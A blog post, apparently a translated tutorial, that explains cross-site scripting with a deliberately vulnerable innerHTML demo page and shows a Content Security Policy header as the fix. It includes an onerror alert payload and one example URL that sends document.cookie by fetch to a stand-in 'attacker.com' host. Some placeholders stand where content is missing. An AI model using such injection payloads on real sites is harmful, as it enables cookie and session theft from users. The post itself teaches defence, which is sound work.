---
title: "What is the CSP header? Why can someone steal your information without you noticing?"
description: "CSP is Content Security Policy, which can prevent attackers from maliciously injecting scripts into your website to steal user information."
category: "Record"
published: 2025-07-31
image: '../../assets/images/e245d917-2255-4d2d-85fb-aa7538a18022.webp'
tags: [XSS攻击, CSP]
draft: false 
lang: en
---
:::ai-summary[AI Summary]{model="qwen/qwen3-vl-8b"}
This article demonstrates how a website lacking a Content Security Policy (CSP) header can be exploited via XSS attacks by injecting malicious HTML through URL parameters. The vulnerability arises from using `innerHTML` to directly render user input without sanitization, allowing scripts like `onerror="alert(...)"` to execute. To mitigate this, implementing a strict CSP header (e.g., `script-src 'self'`) blocks such inline scripts, preventing XSS and protecting users from data theft or unauthorized actions.
:::

# For example!

This is a website without a CSP header: [Click me](https://none-csp-demo.pages.dev/nocsp?name=%3Cimg%20src=x%20onerror=%22alert(%27XSS%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%27)%22%3E)

Unless otherwise expected, your browser will pop up a prompt.

![](../../assets/images/b279f283-b5d2-4dbd-955e-5b3bba6ff656.webp)

# How is this achieved?

This project is open-sourced at [afoim/none_csp_demo](https://github.com/afoim/none_csp_demo)

HTML content is

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>欢迎页面</title>
</head>
<body>
  <h1>欢迎</h1>
  <p>你好，<span id="name"></span>！</p>

  <script>
    // 从 URL 参数读取用户名并显示
    const params = new URLSearchParams(location.search);
    const name = params.get("name");
    document.getElementById("name").innerHTML = name;
  </script>
</body>
</html>
```

This website is very simple, and the webpage dynamically displays the username through the query string `?name=xxx`.

For example, if you input https://none-csp-demo.pages.dev/nocsp?name=AcoFork, the webpage will display

![](../../assets/images/366d0934-9c3a-4196-a7ae-1c230c916daf.webp)

But according to the source code, the webpage directly inserts text via `innerHTML`.

This method involves no security review and directly concatenates incoming content into HTML.

So... what if we give the website such a `name`?

Try entering

[[X:content]]

You will find that the website does not print out any username, and the browser pops up a strange window.

![](../../assets/images/e86cfeed-a9d4-402b-aed0-fc3624f3e925.webp)

We use F12 to view the source code of the current webpage.

![](../../assets/images/ad38bc52-e689-4923-b79c-894dc9ab4136.webp)

Found in `<span id="name"></span>`

A `<img src="x" onerror="alert('XSS')">` has been inserted!

That is to say, the web page did not interpret the `name` we passed in as plain text.

but violence directly inserted into HTML

The browser did not render it `Hello, <img src="x" onerror="alert('XSS attack successful')">!`

But it directly executed the following as HTML: `<img src="x" onerror="alert('XSS')">`

Since `src=x` is certainly unobtainable, and because a fallback source `onerror` has been set

The browser directly executed the script `alert('XSS attack successful')`.

# What are the hazards?

By analogy, since we can make the browser pop up a prompt box,

That would also allow doing other things.

The attacker can easily forge a URL and send it to you, for example **obtain your browser's Cookie and send it to a specified server via Fetch**!!!
`https://victim-site.com/page?name=<img src=x onerror="fetch('https://attacker.com/log?cookie='+document.cookie)">`

# How to configure CSP to prevent such attacks?

Try accessing this URL, which has a strict CSP policy set.

[[X:content]]

You will find that no prompt box pops up, and an error appears in the F12 console.

![](../../assets/images/2febeecf-6f54-4c6a-b775-ef2ac8598f37.webp)

**Here is the translation and explanation provided by GPT**

**Translation:**

> Inline scripts are being blocked because they violate the following CSP directive: `script-src 'self'`. To allow execution of inline scripts, you must use the `'unsafe-inline'` keyword, specify a hash (e.g., `'sha256-raHeKmhSLYgI2dPMTS+XHraijHkbV3RTs8np6RhiKqQ='`), or use a nonce (e.g., `'nonce-...'`).

**Explanation:**
Your CSP policy specifies that only scripts from the same origin (`'self'`) are allowed, but you have written `<script>...</script>` such **inline script** (inline script) within your HTML page. This is blocked by the current CSP and cannot be executed.

Thus, we have successfully avoided XSS attacks.

Add the following content in the HTML head [[X:content]]

```html
  <!-- 安全的 CSP 策略 -->
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self';
    object-src 'none';
    frame-ancestors 'none';
    base-uri 'self';
  ">
```

# How can I ensure my data security?

1. If you are operating a site, **ensure that each site has a strict CSP policy set**. This way, even if an attacker attempts XSS injection, it will be blocked by the CSP policy.

2. **Do not casually click on links or scan QR codes from unknown sources**. For short links or obfuscated links, first resolve them to identify the final destination, assess the risk, and then proceed to visit. Alternatively, access the site in incognito mode. It is possible that the target website does not have strict CSP policies, which may lead to leakage of your personal data.